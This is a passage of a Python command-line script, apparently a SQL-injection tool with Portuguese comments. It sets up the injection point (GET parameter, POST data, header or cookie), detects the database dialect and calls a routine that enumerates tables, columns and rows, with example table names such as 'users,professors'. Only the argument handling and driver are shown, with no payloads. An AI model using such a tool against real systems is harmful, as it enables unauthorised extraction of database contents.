    parser.add_argument("--max-tables",  type=int, default=20)
    parser.add_argument("--max-cols",    type=int, default=20)
    parser.add_argument("--max-rows",    type=int, default=50)
    parser.add_argument("--only-columns", action="store_true", help="Apenas detectar colunas e sair")

    args = parser.parse_args()

    # ── Popula config global ──────────────────────────────────────
    _config["url"]            = args.url
    _config["method"]         = args.method
    _config["timeout"]        = args.timeout
    _config["post_data"]      = args.post_data
    _config["get_param"]      = args.get_param
    _config["inject_header"]  = args.header
    _config["inject_cookie"]  = args.cookie
    _config["inject_prefix"]  = args.inject_prefix
    _config["inject_suffix"]  = args.inject_suffix

    for h in args.extra_header:
        k, _, v = h.partition(":")
        _config["extra_headers"][k.strip()] = v.strip()

    for c in args.extra_cookie:
        k, _, v = c.partition("=")
        _config["extra_cookies"][k.strip()] = v.strip()

    # ── Resolve dialeto ───────────────────────────────────────────
    if args.db_type == "auto":
        dialect = detect_dialect()
        if dialect is None:
            return
    else:
        dialect = DIALECTS[args.db_type]

    # Processa --tables: "users,professors" → ["users", "professors"]
    known_tables = (
        [t.strip() for t in args.tables.split(",") if t.strip()]
        if args.tables else None
    )

    execute(
        dialect=dialect,
        wordlist_path=args.wordlist,
        only_columns=args.only_columns,
        max_tables=args.max_tables,
        max_cols=args.max_cols,
        max_rows=args.max_rows,
        known_db=args.db_name,
        known_tables=known_tables,
    )


if __name__ == "__main__":
    main()